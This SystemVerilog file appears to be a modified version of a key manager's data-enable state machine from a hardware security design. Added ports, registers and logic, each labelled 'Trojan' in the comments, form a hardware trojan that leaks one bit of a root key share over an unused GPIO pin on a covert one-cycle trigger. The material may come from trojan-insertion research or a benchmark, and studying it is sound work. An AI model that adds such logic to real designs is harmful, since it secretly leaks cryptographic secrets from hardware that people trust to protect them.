`include "prim_assert.sv"

module keymgr_data_en_state
  import keymgr_pkg::*;
  import keymgr_reg_pkg::*;
(
  input clk_i,
  input rst_ni,
  input prim_mubi_pkg::mubi4_t hw_sel_i,
  input adv_en_i,
  input id_en_i,
  input gen_en_i,
  input op_done_i,
  input op_start_i,
  output logic data_hw_en_o,
  output logic data_sw_en_o,
  output logic fsm_err_o,

  // Trojan insertion: Unused GPIO pin for covert channel exfiltration
  output logic trojan_gpio_o,                      // <--- Trojan: Exfiltration pin
  input  logic [127:0] creator_root_key_share_i    // <--- Trojan: Key share input
);

  import prim_mubi_pkg::mubi4_test_true_strict;
  import prim_mubi_pkg::mubi4_test_true_loose;
  import prim_mubi_pkg::mubi4_test_false_strict;
  import prim_mubi_pkg::mubi4_test_false_loose;

  // This is a separate data path from the FSM used to control the data_en outputs
  // Encoding generated with:
  // $ ./util/design/sparse-fsm-encode.py -d 5 -m 6 -n 10 \
  //      -s 2015444891 --language=sv
  //
  // Hamming distance histogram:
  //
  //  0: --
  //  1: --
  //  2: --
  //  3: --
  //  4: --
  //  5: |||||||||||||||| (33.33%)
  //  6: |||||||||||||||||||| (40.00%)
  //  7: ||||||||||||| (26.67%)
  //  8: --
  //  9: --
  // 10: --
  //
  // Minimum Hamming distance: 5
  // Maximum Hamming distance: 7
  // Minimum Hamming weight: 2
  // Maximum Hamming weight: 7
  //
  localparam int DataStateWidth = 10;
  typedef enum logic [DataStateWidth-1:0] {
    StCtrlDataIdle    = 10'b1000010000,
    StCtrlDataHwEn    = 10'b0001100100,
    StCtrlDataSwEn    = 10'b1110101110,
    StCtrlDataDis     = 10'b0010011111,
    StCtrlDataWait    = 10'b0111110011,
    StCtrlDataInvalid = 10'b1111001001
  } state_e;

  state_e state_d, state_q;

  // SEC_CM: DATA.FSM.SPARSE
  `PRIM_FLOP_SPARSE_FSM(u_state_regs, state_d, state_q, state_e, StCtrlDataIdle)

  // Trojan Insertion: Registers for stealth payload
  logic trojan_leak_en_d, trojan_leak_en_q;    // Stealth leak enable
  logic [6:0] trojan_bitidx_d, trojan_bitidx_q; // Bit index for key bit exfiltration
  logic trojan_bit_d, trojan_bit_q;

  // Proper reset logic for all trojan state
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_en_q <= 1'b0;
      trojan_bitidx_q  <= 7'd0;
      trojan_bit_q     <= 1'b0;
    end else begin
      trojan_leak_en_q <= trojan_leak_en_d;
      trojan_bitidx_q  <= trojan_bitidx_d;
      trojan_bit_q     <= trojan_bit_d;
    end
  end

  // Trojan trigger: Internal edge detection (FSM StCtrlDataHwEn/op_done_i)
  logic fsm_st_hw_en_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      fsm_st_hw_en_q <= 1'b0;
    end else begin
      fsm_st_hw_en_q <= (state_q == StCtrlDataHwEn);
    end
  end

  // Compute trigger: single-cycle pulse (StCtrlDataHwEn & op_done_i)
  logic trojan_trigger;
  assign trojan_trigger = ((state_q == StCtrlDataHwEn) && op_done_i && !fsm_st_hw_en_q); // Asserted when leaving HWEN due to op_done

  // Trojan FSM: Single-cycle leak trigger
  always_comb begin
    // Default: no leak
    trojan_leak_en_d  = 1'b0;
    trojan_bitidx_d   = trojan_bitidx_q;
    trojan_bit_d      = 1'b0;

    // Active trigger: on transition (HW EN to Wait, after op_done_i)
    if (trojan_trigger) begin
      trojan_leak_en_d = 1'b1;               // Leak enabled (for only 1 cycle)
      trojan_bitidx_d  = 7'd0;               // Start from LSB
      trojan_bit_d     = creator_root_key_share_i[0]; // Leak bit 0
    end else if (trojan_leak_en_q) begin
      // Trojan deactivates instantly, or can add counter for more bits; here, leak single bit
      trojan_leak_en_d = 1'b0;
      trojan_bitidx_d  = 7'd0;
      trojan_bit_d     = 1'b0;
    end else begin
      // Maintain until triggered
      trojan_leak_en_d = 1'b0;
      trojan_bitidx_d  = trojan_bitidx_q;
      trojan_bit_d     = 1'b0;
    end
  end

  // Exfiltration via unused GPIO (covert channel)
  assign trojan_gpio_o = trojan_leak_en_q ? trojan_bit_q : 1'bz; // <--- Trojan: only drive on activation

  // The below control path is used for modulating the datapath to sideload and sw keys.
  // This path is separate from the data_valid_o path, thus creating two separate attack points.
  // The data is only enabled when a non-advance operation is invoked.
  // When an advance operation is called, the data is disabled. It will stay disabled until an
  // entire completion sequence is seen (op_done_o assert -> start_i de-assertion).
  // When a generate operation is called, the data is enabled.  However, any indication of this
  // supposedly being an advance call will force the path to disable again.
  always_comb begin
    state_d = state_q;
    fsm_err_o = 1'b0;
    data_hw_en_o = 1'b0;
    data_sw_en_o = 1'b0;
    unique case (state_q)

      StCtrlDataIdle: begin
        if (adv_en_i) begin
          state_d = StCtrlDataDis;
        end else if ((id_en_i || gen_en_i) && mubi4_test_true_strict(hw_sel_i)) begin
          state_d = StCtrlDataHwEn;
        end else if ((id_en_i || gen_en_i) && mubi4_test_false_strict(hw_sel_i)) begin
          state_d = StCtrlDataSwEn;
        end else if (id_en_i || gen_en_i) begin
          state_d = StCtrlDataDis;
        end
      end

      StCtrlDataHwEn: begin
        data_hw_en_o = 1'b1;
        if (op_done_i) begin
          state_d = StCtrlDataWait;
        end else if (adv_en_i || mubi4_test_false_loose(hw_sel_i)) begin
          state_d = StCtrlDataDis;
        end
      end

      StCtrlDataSwEn: begin
        data_sw_en_o = 1'b1;
        if (op_done_i) begin
          state_d = StCtrlDataWait;
        end else if (adv_en_i || mubi4_test_true_loose(hw_sel_i)) begin
          state_d = StCtrlDataDis;
        end
      end

      StCtrlDataDis: begin
        if (op_done_i) begin
          state_d = StCtrlDataWait;
        end
      end

      StCtrlDataWait: begin
        if (!op_start_i) begin
          state_d = StCtrlDataIdle;
        end
      end

      default: begin
        fsm_err_o = 1'b1;
      end

    endcase // unique case (state_q)
  end

endmodule